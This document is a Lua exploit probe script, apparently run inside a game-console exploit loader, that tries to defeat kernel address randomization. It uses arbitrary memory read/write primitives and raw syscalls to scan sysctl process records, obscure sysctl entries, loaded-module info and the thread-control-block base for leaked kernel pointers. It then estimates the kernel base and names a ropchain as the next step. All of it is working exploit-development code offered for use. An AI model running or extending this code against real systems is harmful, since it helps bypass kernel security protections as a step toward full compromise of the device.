-- CRASH_CLASS: RISKY (ropchain manipulation for KASLR defeat)
-- PROBE 42b: bypass kinfo_proc sanitization to leak kernel base
--
-- Multi-approach KASLR defeat:
--   A) Dense kinfo_proc scan (42a only sampled every 64 bytes)
--   B) kldsym (syscall 337) — directly resolves kernel symbols
--   C) kldstat (syscall 306) — kernel module base addresses
--   D) sysctl debug/security MIBs that may leak addresses
--   E) Ropchain: overwrite fn_addr to call sceKernelGetModuleInfo-like
--      functions that return unsanitized kernel addresses
--   F) Read FS/GS base via ropchain (thread-local has kernel ptrs)

print("=== PROBE 42b: KASLR DEFEAT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%X%08X", v.h, v.l), v.h, v.l
    end
    local n = to_num(v)
    return string.format("0x%X", n), 0, n
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_getpid = make_syscall(20)
local sc_sysctl = make_syscall(202)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(588)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

local kptrs_found = {}
local function record_kptr(source, off, h, l)
    kptrs_found[#kptrs_found + 1] = {
        src = source, off = off, h = h, l = l
    }
end

--------------------------------------------------------------------
-- A) Dense kinfo_proc scan — every qword
--------------------------------------------------------------------
print("")
print("=== A: DENSE KINFO_PROC ===")
do
    local mib = memory.alloc(16)
    safe_wd(mib, 1)      -- CTL_KERN
    safe_wd(mib + 4, 14)  -- KERN_PROC
    safe_wd(mib + 8, 1)   -- KERN_PROC_PID
    safe_wd(mib + 12, pid)

    local outbuf = memory.alloc(0x1000)
    for off = 0, 0xFF, 4 do safe_wd(outbuf + off, 0) end
    local oldlenp = memory.alloc(8)
    safe_wd(oldlenp, 0x1000)

    local ok, ret = pcall(function()
        return sc_sysctl(uint64(mib), uint64(4), uint64(outbuf),
            uint64(oldlenp), uint64(0), uint64(0))
    end)
    local rv = ok and to_num(ret) or -999
    local actual_len = safe_rd(oldlenp) or 0
    print("ret=" .. rv .. " len=" .. actual_len)

    if rv == 0 and actual_len > 0 then
        local found = 0
        for off = 0, actual_len - 8, 8 do
            local q = safe_rq(outbuf + off)
            if q then
                local h, l = get_hi_lo(q)
                -- kernel ptrs: 0xFFFF8xxx or higher
                if h >= 0xFFFF8000 then
                    print(string.format("  +%03X: %08X_%08X KPTR!", off, h, l))
                    record_kptr("kinfo", off, h, l)
                    found = found + 1
                -- also check for addresses in 0x8xxxxxxx_xxxxxxxx range
                -- (kernel text on some configurations)
                elseif h >= 0x80000000 and h < 0xFFFF0000 and l ~= 0 then
                    print(string.format("  +%03X: %08X_%08X HIGH?", off, h, l))
                    found = found + 1
                end
            end
        end
        if found == 0 then
            print("  no kernel pointers (all sanitized)")
        end
    end
end

-- B) kldsym SKIPPED — crashes the loader (hard fault on syscall 337)

-- C) kldstat SKIPPED — crashes the loader (hard fault on syscall 306)

--------------------------------------------------------------------
-- D) Obscure sysctl MIBs
--------------------------------------------------------------------
print("")
print("=== D: OBSCURE SYSCTL MIBS ===")
do
    local function try_sysctl_raw(label, mib_vals, sz)
        sz = sz or 0x200
        local mib = memory.alloc(#mib_vals * 4)
        for i, v in ipairs(mib_vals) do safe_wd(mib + (i-1)*4, v) end
        local out = memory.alloc(sz)
        for off = 0, math.min(sz-1, 0xFF), 4 do safe_wd(out + off, 0) end
        local lenp = memory.alloc(8)
        safe_wd(lenp, sz)
        local ok, ret = pcall(function()
            return sc_sysctl(uint64(mib), uint64(#mib_vals),
                uint64(out), uint64(lenp), uint64(0), uint64(0))
        end)
        local rv = ok and to_num(ret) or -999
        local alen = safe_rd(lenp) or 0
        if rv ~= 0 then
            print(string.format("  %s: ret=%d", label, rv))
            return
        end
        -- scan for kernel ptrs
        local found_k = false
        for off = 0, math.min(alen - 1, sz - 8), 8 do
            local q = safe_rq(out + off)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 then
                    print(string.format("  %s +%03X: %08X_%08X KPTR!", label, off, h, l))
                    record_kptr("sysctl:" .. label, off, h, l)
                    found_k = true
                end
            end
        end
        if not found_k then
            -- print value if small
            if alen <= 8 then
                local q = safe_rq(out)
                print(string.format("  %s: len=%d val=%s", label, alen, q and qw_hex(q) or "?"))
            else
                print(string.format("  %s: len=%d (no kptrs)", label, alen))
            end
        end
    end

    -- security.jail.jailed
    try_sysctl_raw("security.jail.jailed", {14, 5, 1}, 8)
    -- kern.features
    try_sysctl_raw("kern.features", {1, 36}, 0x200)
    -- kern.proc.args (might leak stack addrs)
    try_sysctl_raw("kern.proc.args." .. pid, {1, 14, 7, pid}, 0x400)
    -- kern.proc.env
    try_sysctl_raw("kern.proc.env." .. pid, {1, 14, 35, pid}, 0x400)
    -- kern.proc.auxv (ELF aux vectors have base addresses)
    try_sysctl_raw("kern.proc.auxv", {1, 14, 36, pid}, 0x400)
    -- kern.proc.groups
    try_sysctl_raw("kern.proc.groups", {1, 14, 2, pid}, 0x100)
    -- kern.proc.rlimit
    try_sysctl_raw("kern.proc.rlimit", {1, 14, 37, pid}, 0x200)
    -- kern.msgbuf (kernel message buffer — might have addresses in text)
    try_sysctl_raw("kern.msgbuf", {1, 33}, 0x1000)
    -- kern.conftxt (kernel config text)
    try_sysctl_raw("kern.conftxt", {1, 34}, 0x1000)
    -- vm.loadavg
    try_sysctl_raw("vm.loadavg", {2, 2}, 0x20)
    -- vm.vmtotal
    try_sysctl_raw("vm.vmtotal", {2, 5}, 0x100)
    -- kern.timecounter.tc.TSC.frequency (might be useful)
    try_sysctl_raw("kern.boottime", {1, 21}, 0x10)
end

--------------------------------------------------------------------
-- E) dynlib_get_info for all loaded modules — PRX base addresses
--------------------------------------------------------------------
print("")
print("=== E: DYNLIB MODULE BASES ===")
do
    local sc_dynlib_get_list = make_syscall(592)
    local sc_dynlib_get_info = make_syscall(593)

    local handles = memory.alloc(1024)
    local num_buf = memory.alloc(8)
    pcall(function() sc_dynlib_get_list(handles, 128, num_buf) end)
    local num = safe_rd(num_buf) or 0
    print("loaded modules: " .. num)

    for i = 0, math.min(num - 1, 15) do
        local handle = safe_rd(handles + i * 4)
        if handle and handle ~= 0 then
            local info = memory.alloc(0x200)
            for off = 0, 0x1F8, 4 do safe_wd(info + off, 0) end
            safe_wd(info, 0x160)  -- size field

            local ok_i = pcall(function()
                sc_dynlib_get_info(uint64(handle), info)
            end)

            if ok_i then
                -- name at +8 (256 bytes)
                local name = ""
                for j = 0, 31 do
                    local b = safe_rd(info + 8 + j)
                    if b then
                        b = b % 256
                        if b >= 0x20 and b < 0x7F then name = name .. string.char(b)
                        elseif b == 0 then break end
                    end
                end

                -- text segment at +0x108
                local txt_q = safe_rq(info + 0x108)
                local txt_sz = safe_rq(info + 0x110)
                -- data segment at +0x118
                local dat_q = safe_rq(info + 0x118)

                local txt_str = txt_q and qw_hex(txt_q) or "?"
                local dat_str = dat_q and qw_hex(dat_q) or "?"

                print(string.format("  [%d] h=%d %s text=%s data=%s",
                    i, handle, name, txt_str, dat_str))

                -- check if any segment addresses are kernel-range
                if txt_q then
                    local h, l = get_hi_lo(txt_q)
                    if h >= 0xFFFF8000 then
                        record_kptr("dynlib:" .. name, 0x108, h, l)
                        print("    *** KERNEL ADDRESS IN MODULE INFO ***")
                    end
                end
            end
        end
    end
end

--------------------------------------------------------------------
-- F) Ropchain-based: read from thread control block
-- The FS segment base contains per-thread kernel data
-- We can use the rdfsbase instruction via a gadget, or
-- use the arch_prctl equivalent (sysarch syscall 165)
--------------------------------------------------------------------
print("")
print("=== F: THREAD CONTROL BLOCK ===")
do
    -- sysarch(AMD64_GET_FSBASE=128, &addr) or (AMD64_GET_GSBASE=129, &addr)
    local sc_sysarch = make_syscall(165)
    local addr_buf = memory.alloc(16)

    -- try FSBASE
    safe_wd(addr_buf, 0)
    safe_wd(addr_buf + 4, 0)
    local ok_fs, ret_fs = pcall(function()
        return sc_sysarch(uint64(128), uint64(addr_buf))
    end)
    local fs_rv = ok_fs and to_num(ret_fs) or -999
    local fs_q = safe_rq(addr_buf)
    print(string.format("  sysarch(GET_FSBASE): ret=%d val=%s", fs_rv,
        fs_q and qw_hex(fs_q) or "?"))

    if fs_rv == 0 and fs_q then
        local fsh, fsl = get_hi_lo(fs_q)
        if fsh >= 0xFFFF8000 then
            print("  *** FS BASE IS A KERNEL ADDRESS ***")
            record_kptr("fsbase", 0, fsh, fsl)
        elseif fsh > 0 or fsl > 0x10000 then
            -- it's a userspace address — read what it points to
            print("  FS base is userspace, reading TCB:")
            for off = 0, 0x78, 8 do
                local q = safe_rq(uint64(fsh * 0x100000000 + fsl + off))
                if q then
                    local h, l = get_hi_lo(q)
                    local tag = ""
                    if h >= 0xFFFF8000 then
                        tag = " KPTR!"
                        record_kptr("tcb", off, h, l)
                    end
                    if h ~= 0 or l ~= 0 then
                        print(string.format("    +%02X: %08X_%08X%s", off, h, l, tag))
                    end
                end
            end
        end
    end

    -- try GSBASE
    safe_wd(addr_buf, 0)
    safe_wd(addr_buf + 4, 0)
    local ok_gs, ret_gs = pcall(function()
        return sc_sysarch(uint64(129), uint64(addr_buf))
    end)
    local gs_rv = ok_gs and to_num(ret_gs) or -999
    local gs_q = safe_rq(addr_buf)
    print(string.format("  sysarch(GET_GSBASE): ret=%d val=%s", gs_rv,
        gs_q and qw_hex(gs_q) or "?"))
end

--------------------------------------------------------------------
-- SUMMARY
--------------------------------------------------------------------
print("")
print("=== KASLR DEFEAT SUMMARY ===")
print("kernel pointers found: " .. #kptrs_found)
for _, kp in ipairs(kptrs_found) do
    print(string.format("  [%s +%03X] %08X_%08X", kp.src, kp.off, kp.h, kp.l))
end

if #kptrs_found > 0 then
    -- try to compute kernel base (typically 0xFFFFFFFF8xxxxxxx aligned to 2MB)
    local best = kptrs_found[1]
    local kbase_h = best.h
    local kbase_l = best.l - (best.l % 0x200000)  -- align down to 2MB
    print(string.format("  estimated kernel base: %08X_%08X", kbase_h, kbase_l))
    print("  *** KASLR DEFEATED — kernel base leaked ***")
else
    print("  no kernel pointers leaked")
    print("  next: use ropchain to directly call kernel-resolving functions")
end

print("")
print("=== PROBE 42b COMPLETE ===")
